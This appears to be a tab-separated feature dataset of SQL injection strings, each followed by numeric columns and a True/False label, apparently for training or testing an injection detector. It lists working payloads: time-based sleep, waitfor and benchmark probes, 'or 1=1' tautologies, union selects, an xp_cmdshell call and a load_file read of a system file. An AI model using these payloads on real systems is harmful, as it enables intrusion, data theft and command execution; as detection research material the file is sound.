sleep(__time__)#	1	0	2	16	0	False
1 or sleep(__time__)#	1	1	2	21	2	False
" or sleep(__time__)#	1	1	2	21	2	False
' or sleep(__time__)#	2	1	2	21	2	False
" or sleep(__time__)="	2	1	3	22	2	False
' or sleep(__time__)='	2	1	3	22	2	False
1) or sleep(__time__)#	1	1	2	22	2	False
") or sleep(__time__)="	2	1	3	23	2	False
') or sleep(__time__)='	2	1	3	23	2	False
1)) or sleep(__time__)#	1	1	2	23	2	False
")) or sleep(__time__)="	2	1	3	24	2	False
')) or sleep(__time__)='	2	1	3	24	2	False
;waitfor delay '0:0:__time__'--	2	0	2	31	2	False
);waitfor delay '0:0:__time__'--	2	0	3	32	2	False
';waitfor delay '0:0:__time__'--	2	0	2	32	2	False
";waitfor delay '0:0:__time__'--	2	0	2	32	2	False
');waitfor delay '0:0:__time__'--	2	0	3	33	2	False
");waitfor delay '0:0:__time__'--	2	0	3	33	2	False
));waitfor delay '0:0:__time__'--	2	0	3	33	2	False
'));waitfor delay '0:0:__time__'--	2	0	3	34	2	False
"));waitfor delay '0:0:__time__'--	2	0	3	34	2	False
benchmark(10000000,md5(1))#	1	0	3	27	0	False
1 or benchmark(10000000,md5(1))#	1	1	3	32	2	False
" or benchmark(10000000,md5(1))#	1	1	3	32	2	False
' or benchmark(10000000,md5(1))#	2	1	3	32	2	False
1) or benchmark(10000000,md5(1))#	1	1	3	33	2	False
") or benchmark(10000000,md5(1))#	1	1	3	33	2	False
') or benchmark(10000000,md5(1))#	2	1	3	33	2	False
1)) or benchmark(10000000,md5(1))#	1	1	3	34	2	False
")) or benchmark(10000000,md5(1))#	1	1	3	34	2	False
')) or benchmark(10000000,md5(1))#	2	1	3	34	2	False
pg_sleep(__time__)--	1	0	2	20	0	False
1 or pg_sleep(__time__)--	1	1	2	25	2	False
" or pg_sleep(__time__)--	1	1	2	25	2	False
' or pg_sleep(__time__)--	2	1	2	25	2	False
1) or pg_sleep(__time__)--	1	1	2	26	2	False
") or pg_sleep(__time__)--	1	1	2	26	2	False
') or pg_sleep(__time__)--	2	1	2	26	2	False
1)) or pg_sleep(__time__)--	1	1	2	27	2	False
")) or pg_sleep(__time__)--	1	1	2	27	2	False
')) or pg_sleep(__time__)--	2	1	2	27	2	False
)%20or%20('x'='x	0	0	3	16	0	True
%20or%201=1	0	0	1	11	0	True
; execute immediate 'sel' || 'ect us' || 'er'	2	0	1	45	8	False
benchmark(10000000,md5(1))#	1	0	3	27	0	False
update	0	1	0	6	0	False
";waitfor delay '0:0:__time__'--	2	0	2	32	2	False
1) or pg_sleep(__time__)--	1	1	2	26	2	False
||(elt(-3+5,bin(15),ord(10),hex(char(45))))	1	1	3	43	0	False
"hi"") or (""a""=""a"	2	1	3	21	2	True
delete	0	1	0	6	0	False
like	0	0	0	4	0	False
" or sleep(__time__)#	1	1	2	21	2	False
pg_sleep(__time__)--	1	0	2	20	0	False
*(|(objectclass=*))	0	0	3	19	0	False
declare @q nvarchar (200) 0x730065006c00650063 ...	0	0	3	50	5	False
 or 0=0 #	1	1	0	9	3	True
insert	0	1	0	6	0	False
1) or sleep(__time__)#	1	1	2	22	2	False
) or ('a'='a	0	1	2	12	2	True
; exec xp_regread	0	1	1	17	2	False
*|	0	0	0	2	0	False
@var select @var as var into temp end --	1	1	1	40	8	False
1)) or benchmark(10000000,md5(1))#	1	1	3	34	2	False
asc	0	0	0	3	0	False
(||6)	0	0	2	5	0	False
"a"" or 3=3--"	2	1	0	14	2	True
" or benchmark(10000000,md5(1))#	1	1	3	32	2	False
# from wapiti	1	0	0	13	2	False
 or 0=0 --	1	1	0	10	3	True
1 waitfor delay '0:0:10'--	2	0	0	26	3	False
 or 'a'='a	0	1	0	10	2	True
hi or 1=1 --"	2	1	0	13	3	True
or a = a	1	1	1	8	3	True
 union all select	0	2	0	17	3	False
) or sleep(__time__)='	2	1	3	22	2	False
)) or benchmark(10000000,md5(1))#	1	1	3	33	2	False
hi' or 'a'='a	1	1	0	13	2	True
0	0	0	0	1	0	False
21 %	0	0	1	4	1	False
limit	0	0	0	5	0	False
 or 1=1	0	1	0	7	2	True
 or 2 > 1	0	1	1	9	4	False
")) or benchmark(10000000,md5(1))#	1	1	3	34	2	False
print	0	0	0	5	0	False
hi') or ('a'='a	1	1	2	15	2	True
 or 3=3	0	1	0	7	2	True
));waitfor delay '0:0:__time__'--	2	0	3	33	2	False
a' waitfor delay '0:0:10'--	2	0	0	27	3	False
1;(load_file(char(47,101,116,99,47,112,97,115, ...	0	1	3	50	1	False
or%201=1	0	1	1	8	0	True
1 or sleep(__time__)#	1	1	2	21	2	False
or 1=1	0	1	0	6	1	True
 and 1 in (select var from temp)--	1	2	2	34	7	False
 or '7659'='7659	0	1	0	16	2	True
 or 'text' = n'text'	2	1	1	20	4	True
 --	1	0	0	3	1	False
 or 1=1 or ''='	1	1	0	15	4	True
declare @s varchar (200) select @s = 0x73656c6 ...	1	1	4	50	8	True
exec xp	0	1	0	7	1	False
; exec master..xp_cmdshell 'ping 172.10.1.255'--	2	1	1	48	4	False
3.10e+17	0	0	0	8	0	False
" or pg_sleep(__time__)--	1	1	2	25	2	False
x' and email is null; --	2	1	1	24	5	False
&	0	0	1	1	0	False
admin' or '	1	1	0	11	2	False
 or 'unusual' = 'unusual'	2	1	1	25	4	True
//	0	0	0	2	0	False
truncate	0	0	0	8	0	False
1) or benchmark(10000000,md5(1))#	1	1	3	33	2	False
\x27union select	0	1	0	16	1	False
declare @s varchar(200) select @s = 0x77616974 ...	1	1	4	50	7	True
tz_offset	0	0	0	9	0	False
sqlvuln	0	0	0	7	0	False
